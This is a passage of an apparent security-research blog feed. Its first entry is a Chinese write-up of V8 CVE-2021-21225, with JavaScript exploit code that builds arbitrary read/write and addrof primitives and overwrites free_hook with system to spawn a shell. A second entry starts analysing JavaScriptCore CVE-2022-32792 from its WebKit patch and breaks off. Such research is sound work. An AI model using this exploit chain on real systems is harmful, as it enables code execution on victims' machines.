class="keyword">if</span> (Handle&lt;JSTypedArray&gt;::<span class="built_in">cast</span>(receiver)-&gt;<span class="built_in">IsDetachedOrOutOfBounds</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Just</span>(<span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在<code>value</code>不是<code>Number</code>的时候，会进一步调用<code>Object::ToNumber</code>这会触发<code>valueOf</code> callback，接下来我们只需要能进入外层的if，这里我们需要让receiver为一个<code>TypedArray</code>，这可以通过<code>Symbol.species</code>来实现，<code>concat</code>会通过<code>Symbol.species</code>来构造需要返回的对象，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakTypedArray</span> <span class="title">extends</span> <span class="title">Float64Array</span> &#123;</span> &#125;</span><br><span class="line">let lta = <span class="keyword">new</span> <span class="built_in">LeakTypedArray</span>(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">lta.__defineSetter__(<span class="string">&#x27;length&#x27;</span>, <span class="built_in">function</span> () &#123; &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> C = <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">C.__defineGetter__(Symbol.species, () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">function</span> () &#123; <span class="keyword">return</span> lta; &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样我们就可以让它返回一个<code>TypedArray</code>了，然后通过<code>valueOf</code> callback，触发数组长度缩减</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype[<span class="number">0</span>] = &#123;</span><br><span class="line">    <span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        a.length = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">Array</span>.prototype[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Build-our-primitive">Build our primitive</h2><h3 id="Info-leak">Info leak</h3><p>在v8中，literal array的储存方式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Low                                                             High</span><br><span class="line">[element 0][element 1]...[element n][Map][Property][Elements][Length]</span><br></pre></td></tr></table></figure><p>所以通过越界读，我们可以泄漏出<code>Map</code>, <code>Property</code>和<code>Elements</code>，从而计算出其它相邻对象的地址</p><h3 id="arbitrary-r-w">arbitrary r/w</h3><p>首先我们要能够得到一个最基本的任意读写能力，通过以上的分析，我们可以轻松泄漏出相邻对象的地址，接下来我们考虑构造一个fake object，它的类型为Float Array，这在第一步的时候，通过泄漏的Map，Property，Elements，Length就可以实现，我们把这些泄漏数据存入fake_object_arr的buffer中，接下来它的buffer就会成为这个fake object。<br>对于一个混合类型的数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKED_SMI_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> PACKED_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> PACKED_FROZEN_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> PACKED_SEALED_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> PACKED_NONEXTENSIBLE_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> HOLEY_SMI_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> HOLEY_FROZEN_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> HOLEY_SEALED_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> HOLEY_NONEXTENSIBLE_ELEMENTS:</span><br><span class="line"><span class="keyword">case</span> HOLEY_ELEMENTS: &#123;</span><br><span class="line">  <span class="comment">// Disallow execution so the cached elements won&#x27;t change mid execution.</span></span><br><span class="line">  <span class="function">DisallowJavascriptExecution <span class="title">no_js</span><span class="params">(isolate)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run through the elements FixedArray and use HasElement and GetElement</span></span><br><span class="line">  <span class="comment">// to check the prototype for missing elements.</span></span><br><span class="line">  <span class="function">Handle&lt;FixedArray&gt; <span class="title">elements</span><span class="params">(FixedArray::cast(array-&gt;elements()), isolate)</span></span>;</span><br><span class="line">  <span class="keyword">int</span> fast_length = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length);</span><br><span class="line">  <span class="built_in">DCHECK</span>(fast_length &lt;= elements-&gt;<span class="built_in">length</span>());</span><br><span class="line">  <span class="built_in">FOR_WITH_HANDLE_SCOPE</span>(isolate, <span class="keyword">int</span>, j = <span class="number">0</span>, j, j &lt; fast_length, j++, &#123;</span><br><span class="line">    Handle&lt;Object&gt; <span class="built_in">element_value</span>(elements-&gt;<span class="built_in">get</span>(j), isolate);</span><br><span class="line">    <span class="keyword">if</span> (!element_value-&gt;<span class="built_in">IsTheHole</span>(isolate)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!visitor-&gt;<span class="built_in">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      Maybe&lt;<span class="keyword">bool</span>&gt; maybe = JSReceiver::<span class="built_in">HasElement</span>(isolate, array, j);</span><br><span class="line">      <span class="keyword">if</span> (maybe.<span class="built_in">IsNothing</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (maybe.<span class="built_in">FromJust</span>()) &#123;</span><br><span class="line">        <span class="comment">// Call GetElement on array, not its prototype, or getters won&#x27;t</span></span><br><span class="line">        <span class="comment">// have the correct receiver.</span></span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(</span><br><span class="line">            isolate, element_value,</span><br><span class="line">            JSReceiver::<span class="built_in">GetElement</span>(isolate, array, j), <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (!visitor-&gt;<span class="built_in">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将会获得对应元素的指针，如果我们通过callback缩减数组长度，并进行垃圾回收，从而让这个目标数组中<code>hole</code>的位置与另外一个存有我们fake_object地址的地址重叠，这个时候<code>elements-&gt;get(j)</code>就会返回我们的fake_object对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [</span><br><span class="line">    <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>, <span class="number">8.8</span>, <span class="number">9.9</span>,</span><br><span class="line">    <span class="comment">/* hole */</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>, <span class="number">8.8</span>, <span class="number">9.9</span>,</span><br><span class="line">    <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>, <span class="number">8.8</span>, <span class="number">9.9</span>,</span><br><span class="line">    <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>, <span class="number">8.8</span>, <span class="number">9.9</span>,</span><br><span class="line">    <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>, <span class="number">8.8</span>, &#123;&#125; <span class="comment">// HOLEY_ELEMENTS</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// var fake_object = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]</span></span><br><span class="line"><span class="comment">// fake_object is defined in information_leak in order to leak its data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addr = helper.lltof(helper.fake_object_arr_buffer_addr)</span><br><span class="line">k.fill(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> fake_jsarray_object_ptr = [</span><br><span class="line">    <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, addr</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里，我们让addr和hole在垃圾回收后重叠，就可以获得一个以<code>fake_object_arr_buffer_addr</code>为地址的对象了，并且这个对象的属性可以通过<code>fake_object</code>来进行任意的控制，我们就获得了基础的任意读写能力，然而这里有一个问题，就是此时我们的对象其实是一个浮点数组，根上面的分析，这里会尝试将这个数组转换为<code>Number</code>，这会抛出异常，如果在原型链上再加一个callback，通过抛出异常我们就可以顺利退出这个函数，并且把得到的fake_object保存下来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype[<span class="number">9</span>] = &#123;</span><br><span class="line">    <span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        a.length = <span class="number">1</span>;</span><br><span class="line">        k.length = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);    <span class="comment">// force gc</span></span><br><span class="line">        <span class="built_in">Object</span>.prototype.valueOf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;trigger&quot;</span>);</span><br><span class="line">            target_array = <span class="built_in">this</span>;</span><br><span class="line">            <span class="keyword">delete</span> <span class="built_in">Object</span>.prototype.valueOf;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&#x27;bailout&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">Array</span>.prototype[<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来构造任意读写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbread</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] read @&quot;</span> + helper.hex(addr));</span><br><span class="line">    helper.fake_object[<span class="number">2</span>] = helper.lltof(addr - <span class="number">0x10n</span>);</span><br><span class="line">    <span class="keyword">return</span> helper.ftoll(target_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbwrite</span>(<span class="params">addr, data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write &quot;</span> + helper.hex(data) + <span class="string">&quot; to @&quot;</span> + helper.hex(addr));</span><br><span class="line">    helper.fake_object[<span class="number">2</span>] = helper.lltof(addr - <span class="number">0x10n</span>);</span><br><span class="line">    target_array[<span class="number">0</span>] = helper.lltof(data &lt;&lt; <span class="number">8n</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>fake_object</code>我们可以控制<code>target_array</code>的属性，<code>fake_object[2]</code>就是<code>target_array</code>的<code>elements</code>指针，由此我们就实现了任意读写。</p><h3 id="address-of">address of</h3><p>在 JavaScript 引擎的漏洞利用中一个很重要的 primitive 就是 address of，让我们获取任意对象的地址，考虑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [&#123;&#125;, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>arr是一个混合数组，其中存储的是对象的指针，我们将对象存入<code>arr[0]</code>再通过任意读读出这个位置的值，就能知道任意对象的地址了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">object</span>) </span>&#123;</span><br><span class="line">    helper.addrof_array[<span class="number">0</span>] = object;</span><br><span class="line">    helper.fake_object[<span class="number">2</span>] = helper.lltof(helper.addrof_array_addr);</span><br><span class="line">    <span class="keyword">return</span> helper.ftoll(target_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Code-execution">Code execution</h2><p>有两种方法，在 JavaScript 引擎的利用中我们可以利用 wasm 或者 JIT 产生的 rwx 代码段写 shellcode，也可以靠普通的glibc方法（这里不同的库版本会有影响），泄漏 glibc 地址，写 freehook 拿到任意代码执行，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] address of array: &quot;</span> + helper.hex(addr_of_arr))</span><br><span class="line"></span><br><span class="line">addr_of_arr_constructor = addrof(arr.constructor) - <span class="number">1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] address of array constructor: &quot;</span> + helper.hex(addr_of_arr_constructor))</span><br><span class="line"></span><br><span class="line">arr_map_addr = arbread(addr_of_arr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] address of arr_map_addr: &quot;</span> + helper.hex(arr_map_addr));</span><br><span class="line"></span><br><span class="line">map_region = arr_map_addr &amp; <span class="number">0xFFFFFFFFFFFF0000n</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] address of map_region: &quot;</span> + helper.hex(map_region));</span><br><span class="line"></span><br><span class="line">p1 = map_region + <span class="number">0x40n</span>;</span><br><span class="line">p2 = arbread(p1) / <span class="number">256n</span>;</span><br><span class="line">p3 = arbread(p2) / <span class="number">256n</span>;</span><br><span class="line">code = arbread(p3) / <span class="number">256n</span> - <span class="number">0x389eb0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] code: &quot;</span> + helper.hex(code));</span><br></pre></td></tr></table></figure><p>通过map我们可以拿到可执行文件的基址，然后通过GOT表拿到libc地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">puts_got = code + <span class="number">0xfd86b0n</span>;</span><br><span class="line">libc_addr = arbread(memcpy_got) / <span class="number">256n</span> - <span class="number">0xbbad0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] puts: &quot;</span> + helper.hex(arbread(puts_got) / <span class="number">256n</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] libc_addr: &quot;</span> + helper.hex(libc_addr));</span><br><span class="line"></span><br><span class="line">freehook = libc_addr + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] freehook: &quot;</span> + helper.hex(freehook));</span><br><span class="line"></span><br><span class="line">system = libc_addr + <span class="number">0x52290n</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] system: &quot;</span> + helper.hex(system));</span><br></pre></td></tr></table></figure><p>然后写freehook为<code>system</code>，最后利用<code>console.log</code>会释放参数，执行任意命令</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arbwrite(freehook, system);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure><p>enjoy your shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;evilCallback: CVE-2021-21225&lt;/h1&gt;
&lt;h2 id=&quot;CVE-2016-1646&quot;&gt;CVE-2016-1646&lt;/h2&gt;
&lt;p&gt;在进行这个分析中，可以先看一个比较旧的漏洞 &lt;code&gt;CVE-2016-1646&lt;/code&gt;，在执行&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
    <category term="v8" scheme="https://kpwnz.github.io/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</title>
    <link href="https://kpwnz.github.io/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/"/>
    <id>https://kpwnz.github.io/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/</id>
    <published>2022-10-04T04:21:51.000Z</published>
    <updated>2023-04-24T19:08:27.058Z</updated>
    
    <content type="html"><![CDATA[<h1>Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</h1><h2 id="Introduction">Introduction</h2><p>Before we jump right into the vulnerability, let’s review the patch of it first.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">From 6983e76741a1bad811783ceac0959ff9953c175d Mon Sep 17 00:00:00 2001</span><br><span class="line">From: Mark Lam &lt;mark.lam@apple.com&gt;</span><br><span class="line">Date: Fri, 20 May 2022 18:33:04 +0000</span><br><span class="line">Subject: [PATCH] Refine B3ReduceStrength&#x27;s range for sign extension</span><br><span class="line"> operations. https://bugs.webkit.org/show_bug.cgi?id=240720</span><br><span class="line"> &lt;rdar://problem/93536782&gt;</span><br><span class="line"></span><br><span class="line">Reviewed by Yusuke Suzuki and Keith Miller.</span><br><span class="line"></span><br><span class="line">* Source/JavaScriptCore/b3/B3ReduceStrength.cpp:</span><br><span class="line"></span><br><span class="line">Canonical link: https://commits.webkit.org/250808@main</span><br><span class="line">git-svn-id: https://svn.webkit.org/repository/webkit/trunk@294563 268f45cc-cd09-0410-ab3c-d52691b4dbfc</span><br><span class="line">---</span><br><span class="line"> Source/JavaScriptCore/b3/B3ReduceStrength.cpp | 61 ++++++++++++++++++-</span><br><span class="line"> 1 file changed, 59 insertions(+), 2 deletions(-)</span><br><span class="line"></span><br><span class="line">diff --git a/Source/JavaScriptCore/b3/B3ReduceStrength.cpp b/Source/JavaScriptCore/b3/B3ReduceStrength.cpp</span><br><span class="line">index f30a68587876..32bcf3d81415 100644</span><br><span class="line">--- a/Source/JavaScriptCore/b3/B3ReduceStrength.cpp</span><br><span class="line">+++ b/Source/JavaScriptCore/b3/B3ReduceStrength.cpp</span><br><span class="line">@@ -1,5 +1,5 @@</span><br><span class="line"> /*</span><br><span class="line">- * Copyright (C) 2015-2020 Apple Inc. All rights reserved.</span><br><span class="line">+ * Copyright (C) 2015-2022 Apple Inc. All rights reserved.</span><br><span class="line">  *</span><br><span class="line">  * Redistribution and use in source and binary forms, with or without</span><br><span class="line">  * modification, are permitted provided that the following conditions</span><br><span class="line">@@ -388,6 +388,61 @@ class IntRange &#123;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">+    template&lt;typename T&gt;</span><br><span class="line">+    IntRange sExt()</span><br><span class="line">+    &#123;</span><br><span class="line">+        ASSERT(m_min &gt;= INT32_MIN);</span><br><span class="line">+        ASSERT(m_max &lt;= INT32_MAX);</span><br><span class="line">+        int64_t typeMin = std::numeric_limits&lt;T&gt;::min();</span><br><span class="line">+        int64_t typeMax = std::numeric_limits&lt;T&gt;::max();</span><br><span class="line">+        auto min = m_min;</span><br><span class="line">+        auto max = m_max;</span><br><span class="line">+</span><br><span class="line">+        if (typeMin &lt;= min &amp;&amp; min &lt;= typeMax</span><br><span class="line">+            &amp;&amp; typeMin &lt;= max &amp;&amp; max &lt;= typeMax)</span><br><span class="line">+            return IntRange(min, max);</span><br><span class="line">+</span><br><span class="line">+        // Given type T with N bits, signed extension will turn bit N-1 as</span><br><span class="line">+        // a sign bit. If bits N-1 upwards are identical for both min and max,</span><br><span class="line">+        // then we&#x27;re guaranteed that even after the sign extension, min and</span><br><span class="line">+        // max will still be in increasing order.</span><br><span class="line">+        //</span><br><span class="line">+        // For example, when T is int8_t, the space of numbers from highest to</span><br><span class="line">+        // lowest are as follows (in binary bits):</span><br><span class="line">+        //</span><br><span class="line">+        //      highest     0 111 1111  ^</span><br><span class="line">+        //                    ...       |</span><br><span class="line">+        //            1     0 000 0001  |   top segment</span><br><span class="line">+        //            0     0 000 0000  v</span><br><span class="line">+        //</span><br><span class="line">+        //           -1     1 111 1111  ^</span><br><span class="line">+        //           -2     1 111 1110  |   bottom segment</span><br><span class="line">+        //                    ...       |</span><br><span class="line">+        //       lowest     1 000 0000  v</span><br><span class="line">+        //</span><br><span class="line">+        // Note that if we exclude the sign bit, the range is made up of 2 segments</span><br><span class="line">+        // of contiguous increasing numbers. If min and max are both in the same</span><br><span class="line">+        // segment before the sign extension, then min and max will continue to be</span><br><span class="line">+        // in a contiguous segment after the sign extension. Only when min and max</span><br><span class="line">+        // spans across more than 1 of these segments, will min and max no longer</span><br><span class="line">+        // be guaranteed to be in a contiguous range after the sign extension.</span><br><span class="line">+        //</span><br><span class="line">+        // Hence, we can check if bits N-1 and up are identical for the range min</span><br><span class="line">+        // and max. If so, then the new min and max can be be computed by simply</span><br><span class="line">+        // applying sign extension to their original values.</span><br><span class="line">+</span><br><span class="line">+        constexpr unsigned numberOfBits = countOfBits&lt;T&gt;;</span><br><span class="line">+        constexpr int64_t segmentMask = (1ll &lt;&lt; (numberOfBits - 1)) - 1;</span><br><span class="line">+        constexpr int64_t topBitsMask = ~segmentMask;</span><br><span class="line">+        int64_t minTopBits = topBitsMask &amp; min;</span><br><span class="line">+        int64_t maxTopBits = topBitsMask &amp; max;</span><br><span class="line">+</span><br><span class="line">+        if (minTopBits == maxTopBits)</span><br><span class="line">+            return IntRange(static_cast&lt;int64_t&gt;(static_cast&lt;T&gt;(min)), static_cast&lt;int64_t&gt;(static_cast&lt;T&gt;(max)));</span><br><span class="line">+</span><br><span class="line">+        return top&lt;T&gt;();</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">     IntRange zExt32()</span><br><span class="line">     &#123;</span><br><span class="line">         ASSERT(m_min &gt;= INT32_MIN);</span><br><span class="line">@@ -2765,9 +2820,11 @@ class ReduceStrength &#123;</span><br><span class="line">                 rangeFor(value-&gt;child(1), timeToLive - 1), value-&gt;type());</span><br><span class="line"> </span><br><span class="line">         case SExt8:</span><br><span class="line">+            return rangeFor(value-&gt;child(0), timeToLive - 1).sExt&lt;int8_t&gt;();</span><br><span class="line">         case SExt16:</span><br><span class="line">+            return rangeFor(value-&gt;child(0), timeToLive - 1).sExt&lt;int16_t&gt;();</span><br><span class="line">         case SExt32:</span><br><span class="line">-            return rangeFor(value-&gt;child(0), timeToLive - 1);</span><br><span class="line">+            return rangeFor(value-&gt;child(0), timeToLive - 1).sExt&lt;int32_t&gt;();</span><br><span class="line"> </span><br><span class="line">         case ZExt32:</span><br><span class="line">             return rangeFor(value-&gt;child(0), timeToLive - 1).zExt32();</span><br></pre></td></tr></table></figure><p>The patch reminds me of several similar CTF challenge of VM although the codes before patching seems innocent. To analyze the vulnerability we need some basic knowledge of JavaScriptCore’s JIT compiler.</p><h3 id="JIT-of-JavaScriptCore">JIT of JavaScriptCore</h3><p>JavaScriptCore has four tiers for JavaScript.</p><ul><li>The LLInt, or low-level interpreter</li><li>The Baseline JIT, also known as a bytecode templete JIT</li><li>The DFG JIT, or data flow graph JIT</li><li>The FTL JIT, or faster than light JIT. FTL JIT uses multiple IRs (DFG IR, DFG SSA IR, 